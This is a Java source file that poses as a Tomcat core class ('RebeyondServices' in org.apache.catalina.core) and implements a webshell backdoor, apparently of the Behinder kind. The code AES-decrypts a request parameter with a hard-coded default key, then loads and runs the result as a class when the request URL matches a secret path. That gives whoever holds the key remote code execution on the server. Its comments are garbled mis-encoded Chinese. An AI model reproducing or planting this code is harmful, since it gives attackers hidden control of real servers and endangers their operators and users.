package org.apache.catalina.core;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

//�����Ҳ��ʹ��ԭʼ�İ취���м��أ���agentע���ǲ��������������º����ġ�
//���Ի��Ǳ����ڶ�������н��������
public class RebeyondServices {
    public static String SERVICE_URL="agenstR";

    //���Զ�������agent�е��ò�����������ʹ�÷������
    //�������ͱ��RequestFacade ���Ա�Ҫ�����ں���������
    //�����õ���4.1 ��Ы
    public static void doServices(java.util.Map rdd,Object obj) //�׳������������
            throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException {
        System.out.println("Rebeyond"+SERVICE_URL);
        if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.RebeyondServices.SERVICE_URL)) { //
            String k="e45e329feb5d925b";/*����ԿΪ��������32λmd5ֵ��ǰ16λ��?Ĭ����������rebeyond*/ //
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES"); //
            c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES")); //
            byte[] data = new sun.misc.BASE64Decoder().decodeBuffer((String) rdd.get("b")); //
            Class clazz = org.apache.catalina.core.utils.Util.extendClassLoader(c.doFinal(data));
            System.out.println(clazz);
            clazz.newInstance().equals(obj);
        }
    }

}
